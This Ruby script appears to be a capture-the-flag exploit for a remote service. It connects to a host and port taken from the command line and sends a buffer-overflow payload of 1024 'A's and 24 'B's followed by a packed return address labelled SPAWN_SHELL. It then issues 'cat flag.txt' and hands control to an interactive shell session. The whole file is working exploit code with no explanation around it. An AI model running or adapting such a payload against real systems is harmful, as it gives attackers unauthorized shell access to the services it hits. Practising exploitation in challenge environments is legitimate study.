#!/usr/bin/env ruby
# encoding: ascii-8bit

require 'expect'
require 'socket'
require 'pty'
require 'io/console'
require 'colorize'

def log data
    $stdout.puts data.inspect.black.on_white
end

def logerror e
    $stdout.puts e.inspect.black.on_red
end


module IOExtension
    def interact
        begin
            until self.closed? do
                readable, _, _, _ = IO.select([self, $stdin])
                readable.each do |source|
                    case source
                    when self
                        input = self.readchar
                        $stdout.print input.cyan
                    when $stdin
                        self.print $stdin.gets
                    else
                        raise StandardError
                    end
                end
            end
        rescue EOFError => e
            logerror e
            self.close
            return
        rescue Interrupt
            return
        end
    end
end

class IO
    prepend IOExtension
end

host = ARGV[0]
port = ARGV[1]
$s = TCPSocket.new host, port

SPAWN_SHELL = 0x400897

print $s.expect('? ')[0]

payload = 'A' * 1024 + 'B' * 24 + [SPAWN_SHELL].pack('Q')
$s.puts payload

sleep 1

$s.puts "cat flag.txt"

$s.interact
